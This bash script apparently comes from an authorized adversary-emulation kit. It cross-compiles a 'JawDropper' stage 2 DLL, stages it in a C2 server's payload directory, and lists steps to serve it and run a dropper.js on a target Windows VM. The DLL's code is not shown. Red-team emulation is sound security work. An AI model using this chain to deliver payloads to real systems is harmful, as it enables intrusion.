#!/bin/bash
# ============================================================================
# ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY
#
# Build script for JawDropper Stage 2 DLL
# Cross-compiles from macOS/Linux using mingw-w64
#
# Prerequisites:
#   macOS:  brew install mingw-w64
#   Ubuntu: apt install mingw-w64
#   Fedora: dnf install mingw64-gcc
# ============================================================================

set -e

echo "============================================================================"
echo "ESINTA EMULATION — JawDropper Build Script"
echo "============================================================================"
echo

# Check for mingw-w64
if ! command -v x86_64-w64-mingw32-gcc &> /dev/null; then
    echo "[!] ERROR: mingw-w64 not found"
    echo
    echo "    Install it with:"
    echo "      macOS:  brew install mingw-w64"
    echo "      Ubuntu: apt install mingw-w64"
    echo "      Fedora: dnf install mingw64-gcc"
    echo
    exit 1
fi

echo "[*] mingw-w64 found: $(which x86_64-w64-mingw32-gcc)"
echo

# Clean previous build
echo "[*] Cleaning previous build..."
make clean 2>/dev/null || true
echo

# Build the DLL
echo "[*] Building JawDropper DLL..."
make
echo

# Copy to payloads directory
echo "[*] Copying to c2-server/payloads/..."
mkdir -p ../c2-server/payloads
cp jawdropper.dll ../c2-server/payloads/payload.dll
echo "[*] Installed: ../c2-server/payloads/payload.dll"
echo

# Show file info
echo "[*] Build complete:"
echo "    DLL:     jawdropper.dll ($(du -h jawdropper.dll | cut -f1))"
echo "    Payload: ../c2-server/payloads/payload.dll"
echo

echo "============================================================================"
echo "Next steps:"
echo "  1. Start C2 server:  cd .. && python3 -m http.server 8888"
echo "  2. Copy dropper.js to Windows VM"
echo "  3. Double-click dropper.js on the target"
echo "============================================================================"
